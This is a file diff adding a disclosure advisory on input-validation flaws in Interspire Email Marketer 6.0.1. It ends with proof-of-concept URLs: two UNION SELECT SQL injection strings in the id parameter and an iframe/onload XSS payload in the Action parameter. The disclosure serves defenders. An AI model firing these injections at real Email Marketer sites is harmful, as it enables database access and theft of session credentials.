@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/55829/info
+
+Interspire Email Marketer is prone to the following input-validation vulnerabilities because it fails to properly sanitize user-supplied input:
+
+1. An SQL injection vulnerabilities
+2. Multiple HTML injection vulnerabilities
+3. A cross-site scripting vulnerability
+
+Exploiting these issues could allow an attacker to run malicious HTML and script codes, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Email Marketer 6.0.1 is vulnerable; other versions may be affected. 
+
+http://www.example.com/admin/index.php?Page=Addons&Addon=dynamiccontenttags&; Action=Edit&id=-1%27+UNION+Select+1,2,3,4--%20- [SQLi]
+
+http://www.example.com/admin/index.php?Page=Addons&Addon=dynamiccontenttags&; Action=Edit&id=-1%27+UNION+Select+1,version%28%29,3,4--%20-[SQLi]
+
+http://www.example.com/admin/index.php?Page=Addons&Addon=
+dynamiccontenttags&Action=%3E%22%3Ciframe%20src=http://www.vulnerability-lab.com%20onload=alert%28%22VL%22%29%3C/iframe%3E [XSS] 
